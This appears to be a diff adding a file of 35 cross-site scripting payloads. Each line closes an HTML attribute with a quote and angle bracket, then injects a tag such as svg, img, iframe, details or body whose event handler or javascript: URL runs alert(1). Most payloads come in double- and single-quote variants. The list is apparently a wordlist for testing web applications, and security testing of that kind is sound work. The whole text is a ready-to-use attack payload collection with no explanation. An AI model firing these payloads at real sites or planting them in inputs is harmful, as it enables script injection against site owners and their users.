@@ -1,0 +1,35 @@
+"><details open ontoggle=alert(1)>
+'><details open ontoggle=alert(1)>
+"><select autofocus onfocus=alert(1)>
+'><select autofocus onfocus=alert(1)>
+"><textarea autofocus onfocus=alert(1)>
+'><textarea autofocus onfocus=alert(1)>
+"><keygen autofocus onfocus=alert(1)>
+'><keygen autofocus onfocus=alert(1)>
+"><video><source onerror=alert(1)>
+'><video><source onerror=alert(1)>
+"><audio src=x onerror=alert(1)>
+'><audio src=x onerror=alert(1)>
+"><input type=image src=x onerror=alert(1)>
+'><input type=image src=x onerror=alert(1)>
+"><form><button formaction=javascript:alert(1)>submit</button></form>
+'><form><button formaction=javascript:alert(1)>submit</button></form>
+"><a href=javascript:alert(1)>click</a>
+'><a href=javascript:alert(1)>click</a>
+"><isindex action=javascript:alert(1) type=image>
+'><isindex action=javascript:alert(1) type=image>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><iframe src=javascript:alert(1)>
+'><iframe src=javascript:alert(1)>
+"><object data=javascript:alert(1)>
+'><object data=javascript:alert(1)>
+"><embed src=javascript:alert(1)>
+'><embed src=javascript:alert(1)>
+"><marquee onstart=alert(1)>
+'><marquee onstart=alert(1)>
+"><body onload=alert(1)>
+'><body onload=alert(1)>
+"><table background=javascript:alert(1)>
